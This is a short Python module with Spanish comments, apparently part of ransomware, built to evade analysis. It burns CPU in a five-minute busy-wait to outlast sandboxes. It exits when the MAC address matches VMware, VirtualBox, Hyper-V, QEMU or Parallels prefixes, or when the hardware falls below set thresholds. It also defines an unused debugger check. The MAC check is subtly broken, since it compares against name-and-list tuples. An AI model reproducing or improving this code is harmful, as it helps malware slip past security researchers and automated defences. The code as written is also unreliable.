import psutil
import sys
import re
import uuid
import ctypes
import time
import random

MAC_PREFIXES = { 
        "VMware": ["00:50:56", "00:0C:29", "00:05:69"],
        "VirtualBox": ["08:00:27"],
        "Hyper-V": ["00:15:5D"],
        "QEMU/KVM": ["52:54:00"],
        "Parallels": ["00:1C:42"]
    }

def evasive_sleep(seconds): #retardo evasivo para engañar a los entornos de análisis automatizado
    start = time.perf_counter()
    while time.perf_counter() - start < seconds:
        _ = sum(random.randint(1, 100) for _ in range(10000))  # Cálculo inútil y costoso a nivel de CPU

def get_mac_address(): # Coger MAC de la primera interfaz de red 
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    return mac.upper()

def check_hypervisor_mac(mac): # Comprobación de la MAC
    for prefixes in MAC_PREFIXES.items():
        if any(mac.startswith(prefix) for prefix in prefixes):
            sys.exit(1)  # Detiene el programa si se detecta la MAC de un hipervisor
    return None

def check_system_requirements(): #Comprobación de requerimientos de hardware
    cpu_cores = psutil.cpu_count(logical=False)  #
    ram = psutil.virtual_memory().total / (1024 ** 3)  
    disk = psutil.disk_usage('/').total / (1024 ** 3)  
    if disk < 64 or ram < 4 or cpu_cores < 2:
        sys.exit(1)

def is_debugger_present_windows():
    try:
        return ctypes.windll.kernel32.IsDebuggerPresent() != 0
    except AttributeError:
        return False

def check_virtualization():
    evasive_sleep(300)  # Función para dormir el ransowmare durante el tiempo especifícado
    check_hypervisor_mac(get_mac_address()) # Comprobación MAC
    check_system_requirements() # Comprobación de recursos hardware 
    
if __name__ == "__main__":
    check_virtualization()